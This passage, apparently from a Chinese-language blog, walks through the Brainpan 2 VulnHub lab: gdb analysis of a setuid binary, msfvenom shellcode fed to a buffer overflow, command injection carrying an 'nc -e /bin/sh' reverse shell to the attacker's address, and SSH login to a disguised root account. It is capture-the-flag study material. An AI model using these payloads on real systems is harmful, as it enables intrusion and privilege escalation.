mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048714 &lt;+115&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048717 &lt;+118&gt;:   call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x0804871c &lt;+123&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x0804871f &lt;+126&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048723 &lt;+130&gt;:   lea    -0x12(%ebp),%eax</span><br><span class="line">   0x08048726 &lt;+133&gt;:   mov    %eax,(%esp)</span><br><span class="line">==&gt;0x08048729 &lt;+136&gt;:   mov    -0x4(%ebp),%eax</span><br><span class="line">   0x0804872c &lt;+139&gt;:   call   *%eax</span><br><span class="line">   0x0804872e &lt;+141&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048731 &lt;+144&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048734 &lt;+147&gt;:   call   0x8048490 &lt;free@plt&gt;</span><br><span class="line">   0x08048739 &lt;+152&gt;:   leave  </span><br><span class="line">   0x0804873a &lt;+153&gt;:   ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>箭头指向的指令是将地址的内容在ebp之前移4个字节，然后将其移动到eax，然后跳转到该地址。</p>
<p>这是用户提供有效输入时的场景：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) b *0x08048729</span><br><span class="line">b *0x08048729</span><br><span class="line">Breakpoint 1 at 0x8048729: file msg_root.c, line 26.</span><br><span class="line">(gdb) r aaaaaaa b</span><br><span class="line">r aaaaaaa b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaa b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff2b <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">    m=0xbfffff33 <span class="string">&quot;b&quot;</span>) at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) x <span class="variable">$ebp</span>-4</span><br><span class="line">x <span class="variable">$ebp</span>-4</span><br><span class="line">0xbffffd54:     0x0804863c</span><br><span class="line">(gdb) x/12xw <span class="variable">$esp</span></span><br><span class="line">x/12xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x6161fe14</span><br><span class="line">0xbffffd48:     0x61616161      0xbfff0061      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff2b      0xbfffff33</span><br></pre></td></tr></table></figure>

<p>您会注意到很少有61个对应于“aaaaaaa”的数字。命令x $ ebp-4显示将被移到eax的地址0x61616161是save_msg方法开始的地方。检查ebp-8的地址0x0804a008表明这是一个复制了第二个参数的内存（在我的情况下是几个b，下面的0x62）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) x/8xw 0x0804a008</span><br><span class="line">x/8xw 0x0804a008</span><br><span class="line">0x804a008:      0x00000062      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;aaaaaaa&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>

<p>可以看到eax现在指向save_msg。提供长的第一个参数可以覆盖将被复制到eax的内存，从而使应用程序崩溃，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) r a b</span><br><span class="line">r a b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root a b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff31 <span class="string">&quot;a&quot;</span>, m=0xbfffff33 <span class="string">&quot;b&quot;</span>)</span><br><span class="line">    at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) x/16xw <span class="variable">$esp</span></span><br><span class="line">x/16xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x0061fe14</span><br><span class="line">0xbffffd48:     0xbffffe24      0xbffffd68      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff31      0xbfffff33</span><br><span class="line">0xbffffd68:     0xbffffde8      0xb7e8ee46      0x00000003      0xbffffe14</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;a&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>

<p>有了这些知识，开始开发阶段。我的想法很简单。在第二个参数中编写shellcode时，在第一个参数中提供shellcode的地址。因此，第一个参数只能是重复了几次的0x0804a008，这给了我：</p>
<p>对于第二个参数，需要shellcode。可以在线找到一个或使用msfvenom：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan2<span class="comment"># msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -b &quot;x00&quot; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 70 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 70</span><br><span class="line">Payload size: 70 bytes</span><br><span class="line">Final size of python file: 357 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x5e\x3f\x89\x9f\xe1&quot;</span></span><br></pre></td></tr></table></figure>

<p>填好二个参数,并执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./msg_root `perl -e <span class="string">&#x27;print &quot;\x04\x08\x08\xa0&quot;x8;&#x27;</span>` `perl -e <span class="string">&#x27;print &quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1&quot;;&#x27;</span>`</span><br></pre></td></tr></table></figure>

<p>读取flag看看，看起来好像成功了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">$ <span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">flag.txt  whatif.txt</span><br><span class="line">$ cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">cat: flag.txt: Permission denied</span><br><span class="line">$ cat whatif.txt</span><br><span class="line">cat whatif.txt</span><br><span class="line"></span><br><span class="line">       WHAT IF I TOLD YOU</span><br><span class="line">              ___</span><br><span class="line">            /     \ </span><br><span class="line">           | ______\</span><br><span class="line">          (, \_/ \_/</span><br><span class="line">           |   ._. |</span><br><span class="line">           \   --- /</span><br><span class="line">           /`-.__.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">      .---&#x27;</span>`-.___|\___</span><br><span class="line">     /                `.</span><br><span class="line"></span><br><span class="line">       YOU ARE NOT ROOT?</span><br><span class="line">$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root  root  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 22 root  root  4096 Nov  5  2013 ..</span><br><span class="line">drwx------  2 root  root  4096 Nov  4  2013 .aptitude</span><br><span class="line">-rw-------  1 root  root     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r--  1 root  root   589 Nov  5  2013 .bashrc</span><br><span class="line">-rw-r--r--  1 root  root   159 Nov  5  2013 .profile</span><br><span class="line">-rw-------  1 root  root   461 Nov  5  2013 flag.txt</span><br><span class="line">-rw-------  1 root  root   245 Nov  5  2013 whatif.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub199.jpg"></p>
<p>必须说，root帐户的窍门很不错。有两个帐户，一个名为root，另一个名为root（末尾有空格）。第二个是这里的真正root用户。看来还有很长的路要走…<br>寻找SUID/SGID执行权限的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null                                                                                                                                                                                        </span><br><span class="line">/sbin/unix_chkpwd</span><br><span class="line">/opt/old/brainpan-1.8/brainpan-1.8.exe</span><br><span class="line">...</span><br><span class="line">$ <span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line"><span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">brainpan-1.8.exe  brainpan.7  brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line">$ cat brainpan.cfg</span><br><span class="line">cat brainpan.cfg</span><br><span class="line">port=9333</span><br><span class="line">ipaddr=0.0.0.0</span><br></pre></td></tr></table></figure>

<p>启动该应用程序并通过我的机器进行了连接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./brainpan-1.8.exe</span><br><span class="line">./brainpan-1.8.exe</span><br><span class="line">port = 9333</span><br><span class="line">ipaddr = 0.0.0.0</span><br><span class="line">+ <span class="built_in">bind</span> <span class="keyword">done</span></span><br><span class="line">+ waiting <span class="keyword">for</span> connections...</span><br><span class="line">+ connection accepted</span><br></pre></td></tr></table></figure>

<p>nc连接之后，执行反弹命令获取shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9333</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 1.8________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: a; nc -e /bin/sh 192.168.56.102 7777</span><br></pre></td></tr></table></figure>

<p>成功获取了puck用户的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 7777</span></span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53497</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)</span><br><span class="line">python -c <span class="string">&#x27;import os,pty;os.setresuid(1001,1001,1001);pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1000(anansi) groups=1001(puck),50(staff),1000(anansi)</span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br></pre></td></tr></table></figure>

<p>查看puck的文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home$ <span class="built_in">cd</span> puck</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line">puck@brainpan2:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh</span><br></pre></td></tr></table></figure>

<p>不是空的bash_history？真奇怪：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">cd</span> .backup</span><br><span class="line"><span class="built_in">cd</span> .backup</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 puck puck 4096 Nov  5  2013 .</span><br><span class="line">drwx------ 4 puck puck 4096 Nov  5  2013 ..</span><br><span class="line">-rw------- 1 puck puck  395 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck puck  220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck puck 3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck puck  675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck puck 4096 Nov  4  2013 .ssh</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/bin</span><br><span class="line">ls -l</span><br><span class="line">./msg_root <span class="string">&quot;comment on the latest version please&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /opt/brainpan/</span><br><span class="line">ps aux</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line"><span class="built_in">cd</span> ../archive</span><br><span class="line">netstat -antp</span><br><span class="line">netstat -antp | grep 9888</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> old</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> brainpan-1.8</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">vi brainpan.7</span><br><span class="line">man ./brainpan.7</span><br><span class="line">ls</span><br><span class="line">htop</span><br><span class="line">top</span><br><span class="line">ls -latr</span><br><span class="line">cat .bash_history </span><br><span class="line">ls</span><br><span class="line">mkdir .backup</span><br><span class="line">mv .ssh .bash* .backup</span><br><span class="line"><span class="built_in">cd</span> .backup/</span><br><span class="line">ls</span><br><span class="line">clear</span><br><span class="line">ls -latr</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">puck@brainpan2:/home/puck/.backup$</span><br></pre></td></tr></table></figure>

<p>因此，puck用户可以通过ssh登录到/目录。我做到了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ mv .ssh .ssh-old</span><br><span class="line">mv .ssh .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ cp -rp .backup/.ssh .</span><br><span class="line">cp -rp .backup/.ssh .</span><br><span class="line">puck@brainpan2:/home/puck$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 32</span><br><span class="line">drwx------ 5 puck  puck   4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root   4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck   4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck      0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck    220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck   3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck    675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  anansi 4096 Nov  4  2013 .ssh</span><br><span class="line">drwx------ 2 puck  puck   4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh: connect to host brainpan2 port 22: Connection refused</span><br></pre></td></tr></table></figure>

<p>看看ssh是否没有运行或在其他端口上运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># Package generated configuration file</span></span><br><span class="line"><span class="comment"># See the sshd_config(5) manpage for details</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># What ports, IPs and protocols we listen for</span></span><br><span class="line">Port 2222</span><br><span class="line"><span class="comment"># Use these options to restrict which interfaces/protocols sshd will bind to</span></span><br><span class="line"><span class="comment">#ListenAddress ::</span></span><br><span class="line"><span class="comment">#ListenAddress 0.0.0.0</span></span><br><span class="line">ListenAddress 127.0.1.1</span><br><span class="line">Protocol 2</span><br><span class="line"><span class="comment"># HostKeys for protocol version 2</span></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_dsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line"><span class="comment">#Privilege Separation is turned on for security</span></span><br><span class="line">UsePrivilegeSeparation yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lifetime and size of ephemeral version 1 server key</span></span><br><span class="line">KeyRegenerationInterval 3600</span><br><span class="line">ServerKeyBits 768</span><br><span class="line"></span><br><span class="line"><span class="comment"># Logging</span></span><br><span class="line">SyslogFacility AUTH</span><br><span class="line">LogLevel INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authentication:</span></span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"><span class="comment">#AuthorizedKeysFile     %h/.ssh/authorized_keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span></span><br><span class="line">IgnoreRhosts yes</span><br><span class="line"><span class="comment"># For this to work you will also need host keys in /etc/ssh_known_hosts</span></span><br><span class="line">RhostsRSAAuthentication no</span><br><span class="line"><span class="comment"># similar for protocol version 2</span></span><br><span class="line">HostbasedAuthentication no</span><br><span class="line"><span class="comment"># Uncomment if you don&#x27;t trust ~/.ssh/known_hosts for RhostsRSAAuthentication</span></span><br><span class="line"><span class="comment">#IgnoreUserKnownHosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To enable empty passwords, change to yes (NOT RECOMMENDED)</span></span><br><span class="line">PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to yes to enable challenge-response passwords (beware issues with</span></span><br><span class="line"><span class="comment"># some PAM modules and threads)</span></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to no to disable tunnelled clear text passwords</span></span><br><span class="line"><span class="comment">#PasswordAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kerberos options</span></span><br><span class="line"><span class="comment">#KerberosAuthentication no</span></span><br><span class="line"><span class="comment">#KerberosGetAFSToken no</span></span><br><span class="line"><span class="comment">#KerberosOrLocalPasswd yes</span></span><br><span class="line"><span class="comment">#KerberosTicketCleanup yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># GSSAPI options</span></span><br><span class="line"><span class="comment">#GSSAPIAuthentication no</span></span><br><span class="line"><span class="comment">#GSSAPICleanupCredentials yes</span></span><br><span class="line"></span><br><span class="line">X11Forwarding yes</span><br><span class="line">X11DisplayOffset 10</span><br><span class="line">PrintMotd no</span><br><span class="line">PrintLastLog yes</span><br><span class="line">TCPKeepAlive yes</span><br><span class="line"><span class="comment">#UseLogin no</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#MaxStartups 10:30:60</span></span><br><span class="line"><span class="comment">#Banner /etc/issue.net</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow client to pass locale environment variables</span></span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line">Subsystem sftp /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span></span><br><span class="line"><span class="comment"># and session processing. If this is enabled, PAM authentication will</span></span><br><span class="line"><span class="comment"># be allowed through the ChallengeResponseAuthentication and</span></span><br><span class="line"><span class="comment"># PasswordAuthentication.  Depending on your PAM configuration,</span></span><br><span class="line"><span class="comment"># PAM authentication via ChallengeResponseAuthentication may bypass</span></span><br><span class="line"><span class="comment"># the setting of &quot;PermitRootLogin without-password&quot;.</span></span><br><span class="line"><span class="comment"># If you just want the PAM account and session checks to run without</span></span><br><span class="line"><span class="comment"># PAM authentication, then enable this but set PasswordAuthentication</span></span><br><span class="line"><span class="comment"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span></span><br><span class="line">UsePAM yes</span><br></pre></td></tr></table></figure>

<p>最后终于成功连接ssh并且找到了flag，过程虽然没有太多很难的知识点，但是真够复杂的，不愧被称为brainpan!!!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">The authenticity of host <span class="string">&#x27;[brainpan2]:2222 ([127.0.1.1]:2222)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[brainpan2]:2222<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Thu Nov  7 11:00:06 2013</span></span><br><span class="line"><span class="string">root @brainpan2:~# id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root ) gid=0(root ) groups=0(root )</span></span><br><span class="line"><span class="string">root @brainpan2:~# whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root </span></span><br><span class="line"><span class="string">root @brainpan2:~# cd /root</span></span><br><span class="line"><span class="string">cd /root</span></span><br><span class="line"><span class="string">root @brainpan2:/root# ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">flag.txt  whatif.txt</span></span><br><span class="line"><span class="string">root @brainpan2:/root# cat flag.txt</span></span><br><span class="line"><span class="string">cat flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          !!! CONGRATULATIONS !!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                 You&#x27;</span>ve completed the Brainpan 2 challenge! </span><br><span class="line">                 Or have you...? </span><br><span class="line"></span><br><span class="line">                 Yes, you have! Pat yourself on the back. :-)</span><br><span class="line"></span><br><span class="line">                 Questions, comments, suggestions <span class="keyword">for</span> new VM</span><br><span class="line">                 challenges? Let me know! </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                 Twitter: @superkojiman</span><br><span class="line">                 Email  : contact@techorganic.com</span><br><span class="line">                 Web    : http://www.techorganic.com</span><br><span class="line"></span><br><span class="line">root @brainpan2:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub200.jpg"></p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>popen()执行多个命令获取shell</li>
<li>gdb调试寻找缓冲区溢出的地址</li>
<li>msfvenom生成shellcode配合ebp-8的地址0x0804a008进行缓冲区溢出提权</li>
<li>更换成ssh备份的私匙，连接具有root权限的ssh</li>
<li>.bash_history中的ssh连接历史中ssh密码泄露</li>
</ul>
